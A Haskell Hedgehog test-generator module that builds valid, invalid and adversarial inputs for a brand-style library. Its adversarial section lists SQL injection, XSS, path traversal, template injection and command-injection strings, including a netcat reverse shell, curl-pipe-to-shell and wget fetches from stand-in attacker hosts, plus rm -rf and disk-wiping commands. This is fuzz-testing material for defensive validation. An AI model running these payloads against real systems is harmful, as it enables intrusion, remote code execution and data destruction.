{- |
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
                                         // foundry // test // brand // generators
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Module      : Test.Foundry.Core.Brand.Generators
Description : Hedgehog generators for ALL brand types
Copyright   : (c) Straylight Software, 2026
License     : BSD-3-Clause

NORMAN STANSFIELD ENERGY - EVERYONE GETS TESTED.

Comprehensive generators with REALISTIC distributions:
- Valid inputs (happy path)
- Invalid inputs (rejection testing)
- Boundary conditions (edge cases)
- Adversarial inputs (poison pills)
- Malformed data (corruption testing)
- Unicode edge cases (emoji, RTL, zero-width)
- Injection attacks (SQL, XSS, control chars)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-}
module Test.Foundry.Core.Brand.Generators
  ( -- * Tagline Generators
    genTaglineText
  , genValidTaglineText
  , genValidatedTaglineText
  , genInvalidTaglineText
  , genPoisonTaglineText
  , genTaglineContext
  , genTagline
  , genPrimaryTagline
  , genSecondaryTagline
  , genTaglineSet
  , genTaglineUsageRule
  
    -- * Editorial Generators
  , genHeadlineCaseStyle
  , genHeadlinePunctuation
  , genHeadlineStyle
  , genListPunctuation
  , genOxfordComma
  , genHyphenationPolicy
  , genExclamationLimit
  , genPunctuationRules
  , genPhoneFormat
  , genTimeFormat
  , genTimeRangeNotation
  , genMidnightNoon
  , genDayAbbreviation
  , genContactTimeRules
  , genRegionalSpelling
  , genConfusedWord
  , genSpellingConventions
  , genTextAlignment
  , genCapitalizationRule
  , genFormattingRules
  , genMasterStyleList
  
    -- * Strategy Generators
  , genMissionStatement
  , genValidMissionText
  , genBrandValue
  , genBrandValues
  , genPersonalityTrait
  , genPersonalityDescription
  , genPositioningType
  , genPositioningStatement
  , genBrandPersonality
  , genStrategicLayer
  
    -- * Adversarial Generators
  , genPoisonPill
  , genSqlInjection
  , genXssPayload
  , genControlChars
  , genUnicodeWeirdness
  , genZeroWidthChars
  , genRtlOverride
  , genHomoglyphAttack

  , genNullInjection
  
    -- * Realistic Text Generators
  , genRealisticBrandName
  , genRealisticTagline
  , genRealisticMission
  , genRealisticValue
  , genRealisticTrait
  
    -- * Stress Test Generators
  , genMassiveText
  , genDeeplyNested
  , genHighCardinality
  ) where

import Data.Text (Text)
import Data.Text qualified as T
import Data.Vector (Vector)
import Data.Vector qualified as V
import Data.Word (Word8)
import Hedgehog (Gen)
import Hedgehog.Gen qualified as Gen
import Hedgehog.Range qualified as Range

import Foundry.Core.Brand.Tagline
  ( TaglineText
  , TaglineContext (..)
  , Tagline
  , PrimaryTagline
  , SecondaryTagline
  , TaglineSet
  , TaglineUsageRule (..)
  , mkTaglineText
  , mkTagline
  , mkPrimaryTagline
  , mkSecondaryTagline
  , mkTaglineSet
  )

import Foundry.Core.Brand.Editorial
  ( HeadlineCaseStyle (..)
  , HeadlinePunctuation (..)
  , HeadlineStyle
  , ListPunctuation (..)
  , OxfordComma (..)
  , HyphenationPolicy (..)
  , ExclamationLimit
  , PunctuationRules
  , PhoneFormat
  , TimeFormat (..)
  , TimeRangeNotation (..)
  , MidnightNoon (..)
  , DayAbbreviation (..)
  , ContactTimeRules
  , RegionalSpelling (..)
  , ConfusedWord
  , SpellingConventions
  , TextAlignment (..)
  , CapitalizationRule (..)
  , FormattingRules
  , MasterStyleList
  , mkHeadlineStyle
  , mkExclamationLimit
  , mkPunctuationRules
  , mkPhoneFormat
  , mkContactTimeRules
  , mkConfusedWord
  , mkSpellingConventions
  , mkFormattingRules
  , mkMasterStyleList
  )

import Foundry.Core.Brand.Strategy
  ( MissionStatement
  , BrandValue
  , BrandValues
  , PersonalityTrait
  , PersonalityDescription
  , PositioningType (..)
  , PositioningStatement
  , BrandPersonality
  , StrategicLayer
  , mkMissionStatement
  , mkBrandValue
  , mkBrandValues
  , mkPersonalityTrait
  , mkPersonalityDescription
  , mkPositioningStatement
  , mkBrandPersonality
  , mkStrategicLayer
  )

-- ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
--                                                  // realistic text patterns
-- ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

-- | Realistic brand names (follows actual naming patterns)
genRealisticBrandName :: Gen Text
genRealisticBrandName = Gen.element
  [ "Acme Corp"
  , "Weyl AI"
  , "Straylight Software"
  , "Nova Industries"
  , "Quantum Labs"
  , "Apex Solutions"
  , "Nexus Digital"
  , "Prism Analytics"
  , "Vertex Systems"
  , "Zenith Technologies"
  , "Foundry"
  , "Hydrogen"
  , "COMPASS"
  , "Linear"
  , "Vercel"
  , "Stripe"
  ]

-- | Realistic taglines (actual marketing patterns)
genRealisticTagline :: Gen Text
genRealisticTagline = Gen.element
  [ "Think Different."
  , "Just Do It."
  , "The Future of Finance"
  , "Empowering Innovation"
  , "Where Dreams Take Flight"
  , "Building Tomorrow, Today"
  , "Your Success, Our Mission"
  , "Excellence in Everything"
  , "Trusted by Millions"
  , "Simply Powerful"
  , "Move Fast and Build Things"
  , "The Developer Experience Company"
  , "Infrastructure for the Internet"
  , "The AI-Native Platform"
  ]

-- | Realistic mission statements
genRealisticMission :: Gen Text
genRealisticMission = Gen.element
  [ "To organize the world's information and make it universally accessible."
  , "To empower every person and organization on the planet to achieve more."
  , "To accelerate the world's transition to sustainable energy."
  , "To give people the power to build community and bring the world closer together."
  , "To be Earth's most customer-centric company."
  , "To unlock human potential through AI."
  , "To make financial infrastructure accessible to every business."
  , "To help developers build and ship software faster."
  , "To create tools that give people superpowers."
  ]

-- | Realistic brand values
genRealisticValue :: Gen Text
genRealisticValue = Gen.element
  [ "Innovation"
  , "Integrity"
  , "Excellence"
  , "Customer Focus"
  , "Collaboration"
  , "Transparency"
  , "Sustainability"
  , "Diversity"
  , "Accountability"
  , "Agility"
  , "Trust"
  , "Quality"
  , "Respect"
  , "Passion"
  , "Courage"
  ]

-- | Realistic personality traits
genRealisticTrait :: Gen Text
genRealisticTrait = Gen.element
  [ "Friendly"
  , "Intelligent"
  , "Helpful"
  , "Bold"
  , "Trustworthy"
  , "Professional"
  , "Innovative"
  , "Approachable"
  , "Confident"
  , "Thoughtful"
  , "Energetic"
  , "Authentic"
  , "Visionary"
  , "Reliable"
  , "Dynamic"
  ]

-- ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
--                                                      // adversarial inputs
-- ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

-- | Generate a poison pill payload designed to corrupt agent state
genPoisonPill :: Gen Text
genPoisonPill = Gen.choice
  [ genSqlInjection
  , genXssPayload
  , genControlChars
  , genUnicodeWeirdness
  , genZeroWidthChars
  , genRtlOverride
  , genHomoglyphAttack
  , genNullInjection
  , genCommandInjection
  , genPathTraversal
  , genTemplateInjection
  ]

-- | SQL injection attempts
genSqlInjection :: Gen Text
genSqlInjection = Gen.element
  [ "'; DROP TABLE brands; --"
  , "1' OR '1'='1"
  , "admin'--"
  , "' UNION SELECT * FROM users --"
  , "'; DELETE FROM agents WHERE '1'='1"
  , "1; UPDATE config SET admin=true; --"
  , "' OR 1=1; --"
  , "'; TRUNCATE TABLE swarm_state; --"
  , "x' AND email IS NOT NULL; --"
  , "' OR ''='"
  ]

-- | XSS payloads
genXssPayload :: Gen Text
genXssPayload = Gen.element
  [ "<script>alert('xss')</script>"
  , "<img src=x onerror=alert(1)>"
  , "<svg onload=alert(1)>"
  , "javascript:alert(1)"
  , "<body onload=alert(1)>"
  , "<iframe src='javascript:alert(1)'>"
  , "\"><script>alert(1)</script>"
  , "'-alert(1)-'"
  , "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>"
  , "<input onfocus=alert(1) autofocus>"
  ]

-- | Control characters that can corrupt parsers
genControlChars :: Gen Text
genControlChars = Gen.element
  [ "\x00\x01\x02\x03"      -- NUL, SOH, STX, ETX
  , "\x07\x08\x0B\x0C"      -- BEL, BS, VT, FF
  , "\x1B[2J\x1B[H"         -- ANSI clear screen
  , "\x1B[31mRED\x1B[0m"    -- ANSI color codes
  , "\r\n\r\n\r\n"          -- Multiple CRLF
  , "\x7F\x7F\x7F"          -- DEL characters
  , "\x1A"                   -- EOF marker (Ctrl+Z)
  , "\x04"                   -- EOT (Ctrl+D)
  , "\x03"                   -- ETX (Ctrl+C interrupt)
  , "\x18"                   -- CAN (Cancel)
  ]

-- | Unicode weirdness
genUnicodeWeirdness :: Gen Text
genUnicodeWeirdness = Gen.element
  [ "Z\x0308a\x030Alg\x0302o"                              -- Zalgo-like
  , "\x1F3F3\xFE0F\x200D\x1F308"                           -- Flag with ZWJ (rainbow flag)
  , "\x1F468\x200D\x1F469\x200D\x1F467\x200D\x1F466"       -- Family emoji with ZWJ
  , "\xFDFA"                                               -- Arabic ligature
  , "\xFDFD"                                               -- Long Arabic ligature
  , "\x2070\x00B9\x00B2\x00B3\x2074\x2075\x2076\x2077\x2078\x2079"  -- Superscript numbers
  , "\x2090\x2091\x2092\x2093"                             -- Subscript letters  
  , "\x0153\x00E6"                                         -- Ligatures oe, ae
  , "\x202E" <> "EVIL" <> "\x202C"                         -- RTL override
  , "\x03A9\x2248\x00E7\x221A\x222B\x02DC\x00B5\x2264\x2265\x00F7"  -- Extended chars
  ]

-- | Zero-width characters (invisible corruption)
genZeroWidthChars :: Gen Text
genZeroWidthChars = Gen.element
  [ "brand\x200B" <> "name"     -- Zero-width space
  , "tag\x200C" <> "line"       -- Zero-width non-joiner
  , "mis\x200D" <> "sion"       -- Zero-width joiner
  , "val\xFEFF" <> "ue"         -- Byte order mark
  , "tr\x2060" <> "ait"         -- Word joiner
  , "\x200B\x200B\x200B"        -- Multiple ZWS
  , "te\x034F" <> "xt"          -- Combining grapheme joiner
  , "no\x2063" <> "rm"          -- Invisible separator
  , "sp\x2064" <> "ace"         -- Invisible plus
  , "co\x2066" <> "de"          -- Left-to-right isolate
  ]

-- | RTL override attacks
genRtlOverride :: Gen Text
genRtlOverride = Gen.element
  [ "\x202E" <> "evil.exe"                    -- RTL override
  , "\x202E" <> "GNP.ELIF"                    -- Fake file extension
  , "safe\x202E\x2066" <> "exe.txt"           -- Mixed isolates
  , "\x200F" <> "hidden"                      -- RTL mark
  , "\x200E" <> "also_hidden"                 -- LTR mark
  , "norm\x202B" <> "al"                      -- Pop directional
  , "\x2067" <> "isolate\x2069"               -- RTL isolate
  , "\x2068" <> "neutral\x2069"               -- First strong isolate
  , "text\x202A\x202B\x202C\x202D\x202E" <> "end"  -- All overrides
  , "\x061C" <> "arabic"                      -- Arabic letter mark
  ]

-- | Homoglyph attacks (looks like valid text but isn't)
genHomoglyphAttack :: Gen Text
genHomoglyphAttack = Gen.element
  [ "аdmin"     -- Cyrillic 'а' instead of Latin 'a'
  , "pаypal"    -- Cyrillic 'а' in paypal
  , "Gооgle"    -- Cyrillic 'о' instead of Latin 'o'
  , "Αpple"     -- Greek Alpha instead of Latin A
  , "Μicrosoft" -- Greek Mu instead of Latin M
  , "Ρaypal"    -- Greek Rho instead of Latin P
  , "Ѕtraylight" -- Cyrillic Ѕ instead of Latin S
  , "Ηydrogen"  -- Greek Eta instead of Latin H
  , "Ϲompass"   -- Greek lunate sigma instead of C
  , "Τoken"     -- Greek Tau instead of Latin T
  ]

-- | Null injection
genNullInjection :: Gen Text
genNullInjection = Gen.element
  [ "valid\x00hidden"
  , "brand\x00'; DROP TABLE--"
  , "\x00start"
  , "end\x00"
  , "mid\x00\x00dle"
  , "\\0escaped"
  , "%00urlencoded"
  , "unicode\x00chars"
  , "mix\x00\x01\x02"
  , "\x00\x00\x00"
  ]

-- | Command injection
genCommandInjection :: Gen Text
genCommandInjection = Gen.element
  [ "; rm -rf /"
  , "| cat /etc/passwd"
  , "`whoami`"
  , "$(id)"
  , "&& curl evil.com | sh"
  , "| nc -e /bin/sh attacker 4444"
  , "; wget evil.com/malware"
  , "| dd if=/dev/zero of=/dev/sda"
  , "&& chmod -R 777 /"
  , "; echo 'pwned' > /tmp/pwned"
  ]

-- | Path traversal
genPathTraversal :: Gen Text
genPathTraversal = Gen.element
  [ "../../../etc/passwd"
  , "....//....//....//etc/passwd"
  , "..%252f..%252f..%252fetc/passwd"
  , "/etc/passwd%00.png"
  , "....\\\\....\\\\....\\\\windows\\system32"
  , "%2e%2e%2f%2e%2e%2f"
  , "..%c0%af..%c0%af"
  , "..%25c0%25af..%25c0%25af"
  , "/var/log/../../../etc/passwd"
  , "C:\\..\\..\\..\\windows\\system32\\config\\sam"
  ]

-- | Template injection
genTemplateInjection :: Gen Text
genTemplateInjection = Gen.element
  [ "{{7*7}}"
  , "${7*7}"
  , "<%= 7*7 %>"
  , "#{7*7}"
  , "${{7*7}}"
  , "@(7*7)"
  , "[[${7*7}]]"
  , "{php}echo 'pwned';{/php}"
  , "{{constructor.constructor('return this')()}}"
  , "${T(java.lang.Runtime).getRuntime().exec('id')}"
  ]

-- ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
--                                                       // tagline generators
-- ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

-- | Generate arbitrary text for tagline testing
genTaglineText :: Gen Text
genTaglineText = Gen.choice
  [ genValidTaglineText
  , genInvalidTaglineText
  , genPoisonTaglineText
  ]

-- | Generate a validated TaglineText value (uses mkTaglineText)
genValidatedTaglineText :: Gen (Maybe TaglineText)
genValidatedTaglineText = do
  txt <- genValidTaglineText
  pure $ mkTaglineText txt

-- | Generate valid tagline text
genValidTaglineText :: Gen Text
genValidTaglineText = Gen.choice
  [ genRealisticTagline
  , Gen.text (Range.linear 1 100) Gen.unicode
  , Gen.text (Range.linear 1 50) Gen.alphaNum
  ]

-- | Generate invalid tagline text (should be rejected)
-- Note: Only includes text that is GUARANTEED to be rejected by mkTaglineText
genInvalidTaglineText :: Gen Text
genInvalidTaglineText = Gen.choice
  [ pure ""                              -- Empty
  , pure "   "                           -- Whitespace only
  , pure "\t\n\r"                        -- Control chars only (strips to empty)
  ]

-- | Generate poison pill tagline text
genPoisonTaglineText :: Gen Text
genPoisonTaglineText = Gen.choice
  [ genPoisonPill
  , genMassiveText
  , pure $ T.replicate 10000 "A"         -- Memory pressure
  ]

-- | Generate tagline context
genTaglineContext :: Gen TaglineContext
genTaglineContext = Gen.element
  [ GeneralContext
  , MarketingCampaign
  , SocialMedia
  , ProductLine
  , InternalCommunication
  , EventContext
  , PartnerContext
  ]

-- | Generate a complete tagline
genTagline :: Gen (Maybe Tagline)
genTagline = do
  txt <- genValidTaglineText
  contexts <- V.fromList <$> Gen.list (Range.linear 1 5) genTaglineContext
  pure $ mkTagline txt contexts

-- | Generate a primary tagline
genPrimaryTagline :: Gen (Maybe PrimaryTagline)
genPrimaryTagline = do
  txt <- genValidTaglineText
  pure $ mkPrimaryTagline txt

-- | Generate a secondary tagline
genSecondaryTagline :: Gen (Maybe SecondaryTagline)
genSecondaryTagline = do
  txt <- genValidTaglineText
  contexts <- V.fromList <$> Gen.list (Range.linear 1 3) genTaglineContext
  pure $ mkSecondaryTagline txt contexts

-- | Generate a complete tagline set
genTaglineSet :: Gen (Maybe TaglineSet)
genTaglineSet = do
  mPrimary <- genPrimaryTagline
  secondaries <- Gen.list (Range.linear 0 5) genSecondaryTagline
  rules <- V.fromList <$> Gen.list (Range.linear 0 4) genTaglineUsageRule
  pure $ do
    primary <- mPrimary
    let validSecondaries = V.fromList [s | Just s <- secondaries]
    pure $ mkTaglineSet primary validSecondaries rules

-- | Generate tagline usage rule
genTaglineUsageRule :: Gen TaglineUsageRule
genTaglineUsageRule = Gen.element
  [ UsageWithLogo
  , UsageStandalone
  , NoModification
  , NoCampaignCombination
  , RequiresApproval
  ]

-- ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
--                                                      // editorial generators
-- ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

genHeadlineCaseStyle :: Gen HeadlineCaseStyle
genHeadlineCaseStyle = Gen.element [TitleCase, SentenceCase, AllCaps, SmallCaps]

genHeadlinePunctuation :: Gen HeadlinePunctuation
genHeadlinePunctuation = Gen.element
  [ AmpersandPreferred
  , AndPreferred
  , AmpersandAllowed
  , NoPeriods
  , NoColons
  ]

genHeadlineStyle :: Gen HeadlineStyle
genHeadlineStyle = do
  caseStyle <- genHeadlineCaseStyle
  punc :: Vector HeadlinePunctuation <- V.fromList <$> Gen.list (Range.linear 0 3) genHeadlinePunctuation
  maxLen :: Maybe Word8 <- Gen.maybe (Gen.word8 (Range.linear 20 100))
  concise <- Gen.element ["Be brief", "Short and punchy", "Maximum impact"]
  pure $ mkHeadlineStyle caseStyle punc maxLen concise

genListPunctuation :: Gen ListPunctuation
genListPunctuation = Gen.element
  [ PeriodsOnAll
  , PeriodsOnFinal
  , NoListPeriods
  , PeriodsOnSentences
  ]

genOxfordComma :: Gen OxfordComma
genOxfordComma = Gen.element [OxfordAlways, OxfordNever, OxfordOptional]

genHyphenationPolicy :: Gen HyphenationPolicy
genHyphenationPolicy = Gen.element
  [ HyphenateCompounds
  , MinimalHyphenation
  , NoHyphenation
  , StyleGuideHyphens
  ]

genExclamationLimit :: Gen ExclamationLimit
genExclamationLimit = mkExclamationLimit <$> Gen.word8 (Range.linear 0 5)

genPunctuationRules :: Gen PunctuationRules
genPunctuationRules = do
  listP <- genListPunctuation
  ox <- genOxfordComma
  hyph <- genHyphenationPolicy
  excl <- genExclamationLimit
  pure $ mkPunctuationRules listP ox hyph excl

genPhoneFormat :: Gen (Maybe PhoneFormat)
genPhoneFormat = do
  fmt <- Gen.element
    [ "XXX-XXX-XXXX"
    , "(XXX) XXX-XXXX"
    , "+X XXX XXX XXXX"
    , "XXX.XXX.XXXX"
    , "+XX XX XXXX XXXX"
    ]
  pure $ mkPhoneFormat fmt

genTimeFormat :: Gen TimeFormat
genTimeFormat = Gen.element [TwelveHour, TwentyFourHour]

genTimeRangeNotation :: Gen TimeRangeNotation
genTimeRangeNotation = Gen.element [EnDash, Hyphen, ToWord]

genMidnightNoon :: Gen MidnightNoon
genMidnightNoon = Gen.element [TwelveAMPM, MidnightNoonWord, TwentyFourStyle]

genDayAbbreviation :: Gen DayAbbreviation
genDayAbbreviation = Gen.element
  [ NeverAbbreviate
  , ThreeLetters
  , TwoLetters
  , ContextualAbbrev
  ]

genContactTimeRules :: Gen (Maybe ContactTimeRules)
genContactTimeRules = do
  mPhone <- genPhoneFormat
  time <- genTimeFormat
  range <- genTimeRangeNotation
  mn <- genMidnightNoon
  day <- genDayAbbreviation
  pure $ do
    phone <- mPhone
    pure $ mkContactTimeRules phone time range mn day

genRegionalSpelling :: Gen RegionalSpelling
genRegionalSpelling = Gen.element
  [ AmericanEnglish
  , BritishEnglish
  , CanadianEnglish
  , AustralianEnglish
  ]

genConfusedWord :: Gen (Maybe ConfusedWord)
genConfusedWord = do
  (incorrect, correct, context) <- Gen.element
    [ ("affect", "effect", "when used as a noun")
    , ("their", "they're", "contraction of they are")
    , ("your", "you're", "contraction of you are")
    , ("loose", "lose", "to not win")
    , ("then", "than", "comparisons")
    , ("its", "it's", "contraction of it is")
    , ("lead", "led", "past tense")
    , ("compliment", "complement", "to complete")
    , ("principal", "principle", "a rule")
    , ("stationary", "stationery", "paper products")
    ]
  pure $ mkConfusedWord incorrect correct context

genSpellingConventions :: Gen SpellingConventions
genSpellingConventions = do
  region <- genRegionalSpelling
  confusedWords <- Gen.list (Range.linear 0 5) genConfusedWord
  let validWords = V.fromList [w | Just w <- confusedWords]
  pure $ mkSpellingConventions region validWords

genTextAlignment :: Gen TextAlignment
genTextAlignment = Gen.element [AlignLeft, AlignCenter, AlignRight, AlignJustify]

genCapitalizationRule :: Gen CapitalizationRule
genCapitalizationRule = Gen.element
  [ CapBrandNames
  , CapProductNames
  , CapAcronyms
  , CapCamelCase
  , CapNoAllCaps
  ]

genFormattingRules :: Gen FormattingRules
genFormattingRules = do
  align <- genTextAlignment
  caps <- V.fromList <$> Gen.list (Range.linear 0 4) genCapitalizationRule
  pure $ mkFormattingRules align caps

genMasterStyleList :: Gen (Maybe MasterStyleList)
genMasterStyleList = do
  headlines <- genHeadlineStyle
  punct <- genPunctuationRules
  mContact <- genContactTimeRules
  spell <- genSpellingConventions
  fmt <- genFormattingRules
  pure $ do
    contact <- mContact
    pure $ mkMasterStyleList headlines punct contact spell fmt

-- ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
--                                                       // strategy generators
-- ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

genMissionStatement :: Gen (Maybe MissionStatement)
genMissionStatement = do
  txt <- genValidMissionText
  pure $ mkMissionStatement txt

genValidMissionText :: Gen Text
genValidMissionText = Gen.choice
  [ genRealisticMission
  , Gen.text (Range.linear 10 500) Gen.unicode
  ]

genBrandValue :: Gen (Maybe BrandValue)
genBrandValue = do
  name <- genRealisticValue
  desc <- Gen.text (Range.linear 10 200) Gen.unicode
  pure $ mkBrandValue name desc

genBrandValues :: Gen (Maybe BrandValues)
genBrandValues = do
  values <- Gen.list (Range.linear 1 7) genBrandValue
  let validValues = V.fromList [v | Just v <- values]
  if V.null validValues
    then pure Nothing
    else pure $ mkBrandValues validValues

genPersonalityTrait :: Gen (Maybe PersonalityTrait)
genPersonalityTrait = do
  trait <- genRealisticTrait
  pure $ mkPersonalityTrait trait

genPersonalityDescription :: Gen (Maybe PersonalityDescription)
genPersonalityDescription = do
  desc <- Gen.text (Range.linear 20 500) Gen.unicode
  pure $ mkPersonalityDescription desc

genPositioningType :: Gen PositioningType
genPositioningType = Gen.element
  [ Ally
  , Guide
  , Facilitator
  , Authority
  , Challenger
  , Creator
  , Caregiver
  , Everyman
  , Hero
  , Sage
  , Explorer
  , Rebel
  ]

genPositioningStatement :: Gen PositioningStatement
genPositioningStatement = do
  ptype <- genPositioningType
  narrative <- Gen.text (Range.linear 20 300) Gen.unicode
  pure $ mkPositioningStatement ptype narrative

genBrandPersonality :: Gen (Maybe BrandPersonality)
genBrandPersonality = do
  traits <- Gen.list (Range.linear 1 5) genPersonalityTrait
  mDesc <- genPersonalityDescription
  pos <- genPositioningStatement
  let validTraits = V.fromList [t | Just t <- traits]
  pure $ do
    desc <- mDesc
    if V.null validTraits
      then Nothing
      else mkBrandPersonality validTraits desc pos

genStrategicLayer :: Gen (Maybe StrategicLayer)
genStrategicLayer = do
  mMission <- genMissionStatement
  mValues <- genBrandValues
  mPersonality <- genBrandPersonality
  pure $ do
    mission <- mMission
    values <- mValues
    personality <- mPersonality
    pure $ mkStrategicLayer mission values personality

-- ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
--                                                         // stress generators
-- ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

-- | Generate massive text for memory pressure testing
genMassiveText :: Gen Text
genMassiveText = Gen.choice
  [ Gen.text (Range.linear 10000 100000) Gen.unicode   -- 10KB-100KB
  , pure $ T.replicate 50000 "X"                        -- 50KB repeated
  , T.unwords <$> Gen.list (Range.linear 1000 5000) genRealisticBrandName
  ]

-- | Generate deeply nested structures
genDeeplyNested :: Gen Text
genDeeplyNested = do
  depth <- Gen.int (Range.linear 100 1000)
  pure $ T.concat
    [ T.replicate depth "["
    , "payload"
    , T.replicate depth "]"
    ]

-- | Generate high cardinality data
genHighCardinality :: Gen [Text]
genHighCardinality = 
  Gen.list (Range.linear 1000 10000) (Gen.text (Range.linear 5 20) Gen.alphaNum)
